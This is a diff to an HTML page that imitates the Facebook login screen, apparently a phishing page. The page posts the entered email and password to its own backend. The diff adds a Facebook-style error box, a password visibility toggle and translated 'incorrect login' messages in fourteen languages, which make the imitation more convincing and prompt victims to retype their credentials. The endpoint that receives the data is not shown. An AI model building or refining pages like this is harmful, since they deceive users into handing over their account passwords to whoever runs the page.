@@ -32,6 +32,77 @@
         .lang-selector-trigger { color: #8a8d91; font-size: 13px; margin: 20px 0; cursor: pointer; display: block; }
         .fb-logo-main { width: 60px; margin: 20px 0 40px; }
         .input-field { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid var(--border-color); border-radius: 12px; background: var(--bg-input); font-size: 16px; outline: none; }
+        .input-field.error {
+            border-color: #b94a48;
+            background: #fff;
+        }
+
+        /* Password Container with Toggle */
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 12px;
+        }
+        .password-container .input-field {
+            margin-bottom: 0;
+            padding-right: 44px;
+        }
+        .password-toggle-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            color: #65676b;
+            display: none;
+        }
+        .password-toggle-icon.show {
+            display: block;
+        }
+        .password-toggle-icon:hover {
+            color: #1c1e21;
+        }
+
+        /* Error Message Box - Facebook Style */
+        .error-box {
+            display: none;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            background: #fff;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #1c1e21;
+            text-align: left;
+        }
+        .error-box.show {
+            display: flex;
+        }
+        .error-icon {
+            flex-shrink: 0;
+            width: 20px;
+            height: 20px;
+            color: #b94a48;
+        }
+        .error-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: currentColor;
+        }
+        .error-text {
+            line-height: 1.4;
+            color: #1c1e21;
+            font-size: 15px;
+        }
+        .error-text a {
+            color: #216fdb;
+            text-decoration: none;
+            font-weight: 600;
+        }
         .btn-login { width: 100%; padding: 12px; background: var(--fb-blue); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 17px; margin-top: 8px; cursor: pointer; }
 
         /* Modal Language */
@@ -78,8 +149,40 @@
             <img class="fb-logo-main" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
             
             <form id="loginForm">
+                <!-- ERROR MESSAGE -->
+                <div class="error-box" id="errorBox">
+                    <div class="error-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20">
+                            <g clip-path="url(#errorIconClip)">
+                                <path d="M12 10.278c.483 0 .875.391.875.875v4.974a.875.875 0 0 1-1.75 0v-4.974c0-.484.392-.875.875-.875zM12 7.003c.833 0 1.25.4 1.25 1s-.417 1-1.25 1-1.25-.4-1.25-1 .417-1 1.25-1z"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16z"></path>
+                            </g>
+                            <defs>
+                                <clipPath id="errorIconClip">
+                                    <path d="M0 0H24V24H0z"></path>
+                                </clipPath>
+                            </defs>
+                        </svg>
+                    </div>
+                    <div class="error-text" id="errorText"></div>
+                </div>
                 <input type="text" class="input-field" id="email" placeholder="Mobile number or email" required>
-                <input type="password" class="input-field" id="password" placeholder="Password" required>
+                <div class="password-container">
+                    <input type="password" class="input-field" id="password" placeholder="Password" required>
+                    <div class="password-toggle-icon" id="passwordToggle" role="button" tabindex="0" aria-label="Show password">
+                        <!-- Show password icon (eye with slash) -->
+                        <svg id="showIcon" viewBox="0 0 24 24" fill="currentColor" width="100%" height="100%">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"></path>
+                            <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"></path>
+                            <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"></path>
+                        </svg>
+                        <!-- Hide password icon (eye open) -->
+                        <svg id="hideIcon" viewBox="0 0 24 24" fill="currentColor" width="100%" height="100%" style="display: none;">
+                            <path fill-rule="evenodd" d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3" clip-rule="evenodd"></path>
+                            <path fill-rule="evenodd" d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z" clip-rule="evenodd"></path>
+                        </svg>
+                    </div>
+                </div>
                 <button type="submit" class="btn-login" id="btn-login-text">Log In</button>
             </form>
             
@@ -169,6 +272,39 @@
     </div>
 
     <script>
+        // Password toggle functionality
+        const passwordInput = document.getElementById('password');
+        const passwordToggle = document.getElementById('passwordToggle');
+        const showIcon = document.getElementById('showIcon');
+        const hideIcon = document.getElementById('hideIcon');
+        
+        if (passwordInput && passwordToggle) {
+            // Show icon when typing
+            passwordInput.addEventListener('input', function() {
+                if (this.value.length > 0) {
+                    passwordToggle.classList.add('show');
+                } else {
+                    passwordToggle.classList.remove('show');
+                }
+            });
+            
+            // Toggle password visibility
+            passwordToggle.addEventListener('click', function() {
+                const isPassword = passwordInput.type === 'password';
+                passwordInput.type = isPassword ? 'text' : 'password';
+                
+                if (isPassword) {
+                    showIcon.style.display = 'none';
+                    hideIcon.style.display = 'block';
+                    passwordToggle.setAttribute('aria-label', 'Hide password');
+                } else {
+                    showIcon.style.display = 'block';
+                    hideIcon.style.display = 'none';
+                    passwordToggle.setAttribute('aria-label', 'Show password');
+                }
+            });
+        }
+
         // Xử lý gửi dữ liệu Login (tránh click 2 lần)
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -212,6 +348,43 @@
                     } else {
                         alert('Đăng nhập thành công!');
                     }
+                } else if (data.login_failed) {
+                    // Hiển thị thông báo lỗi đăng nhập sai
+                    const errorBox = document.getElementById('errorBox');
+                    const errorText = document.getElementById('errorText');
+                    const emailInput = document.getElementById('email');
+                    const passwordInput = document.getElementById('password');
+                    
+                    // Lấy ngôn ngữ hiện tại
+                    const currentLang = document.getElementById('current-lang-display').innerText;
+                    
+                    // Thông báo lỗi theo ngôn ngữ
+                    const errorMessages = {
+                        'English (US)': 'The login information you entered is incorrect. <a href="#">Find your account and log in.</a>',
+                        'Tiếng Việt': 'Thông tin đăng nhập bạn nhập không chính xác. <a href="#">Tìm tài khoản của bạn và đăng nhập.</a>',
+                        'ภาษาไทย': 'ข้อมูลเข้าสู่ระบบที่คุณป้อนไม่ถูกต้อง <a href="#">ค้นหาบัญชีของคุณและเข้าสู่ระบบ</a>',
+                        'Español': 'La información de inicio de sesión que ingresaste es incorrecta. <a href="#">Encuentra tu cuenta e inicia sesión.</a>',
+                        'Français': 'Les informations de connexion que vous avez entrées sont incorrectes. <a href="#">Retrouvez votre compte et connectez-vous.</a>',
+                        'Deutsch': 'Die eingegebenen Anmeldedaten sind falsch. <a href="#">Finde dein Konto und melde dich an.</a>',
+                        'Português': 'As informações de login que você inseriu estão incorretas. <a href="#">Encontre sua conta e faça login.</a>',
+                        '中文 (简体)': '您输入的登录信息不正确。<a href="#">查找您的帐户并登录。</a>',
+                        '日本語': '入力されたログイン情報が正しくありません。<a href="#">アカウントを探してログインしてください。</a>',
+                        '한국어': '입력하신 로그인 정보가 올바르지 않습니다. <a href="#">계정을 찾고 로그인하세요.</a>',
+                        'Bahasa Indonesia': 'Informasi login yang Anda masukkan salah. <a href="#">Temukan akun Anda dan masuk.</a>',
+                        'Türkçe': 'Girdiğiniz giriş bilgileri yanlış. <a href="#">Hesabınızı bulun ve giriş yapın.</a>',
+                        'Русский': 'Введенная вами информация для входа неверна. <a href="#">Найдите свой аккаунт и войдите.</a>',
+                        'العربية': 'معلومات تسجيل الدخول التي أدخلتها غير صحيحة. <a href="#">ابحث عن حسابك وسجّل الدخول.</a>'
+                    };
+                    
+                    errorText.innerHTML = errorMessages[currentLang] || errorMessages['English (US)'];
+                    errorBox.classList.add('show');
+                    
+                    // Thêm class error cho input
+                    emailInput.classList.add('error');
+                    passwordInput.classList.add('error');
+                    
+                    // Focus vào input email
+                    emailInput.focus();
                 } else {
                     alert(data.error || 'Email hoặc mật khẩu không đúng.');
                 }
